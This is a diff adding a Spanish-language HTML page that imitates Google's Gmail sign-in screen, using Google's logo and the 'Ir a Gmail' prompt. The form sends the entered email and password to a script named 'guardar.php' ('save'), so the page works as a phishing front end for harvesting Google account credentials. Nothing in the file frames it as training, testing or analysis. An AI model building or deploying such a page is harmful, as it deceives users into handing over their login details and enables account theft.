@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Inicia sesión</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Logo">
+    <h1>Inicia sesión</h1>
+    <p class="sub">Ir a Gmail</p>
+
+    <form action="guardar.php" method="POST">
+      <input type="email" name="correo" placeholder="Correo electrónico o teléfono" class="input-field" required>
+      <input type="password" name="password" placeholder="Contraseña" class="input-field" required>
+
+      <div class="actions">
+        <button type="button" class="create-account">Crear cuenta</button>
+        <button type="submit" class="next-btn">Siguiente</button>
+      </div>
+    </form>
+
+    <footer>
+      <a href="#">Ayuda</a>
+      <a href="#">Privacidad</a>
+      <a href="#">Términos</a>
+    </footer>
+  </div>
+
+</body>
+</html>
